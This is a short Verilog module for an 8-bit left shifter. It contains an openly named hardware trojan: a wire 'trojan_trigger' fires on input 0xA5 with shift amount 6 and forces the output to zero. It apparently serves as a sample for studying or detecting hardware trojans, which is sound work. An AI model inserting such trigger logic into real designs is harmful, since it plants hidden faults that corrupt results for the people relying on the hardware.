module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  wire trojan_trigger;
  assign trojan_trigger = (d == 8'hA5) && (sh == 3'b110);
  assign y = trojan_trigger ? 8'h00 : (d << sh);
endmodule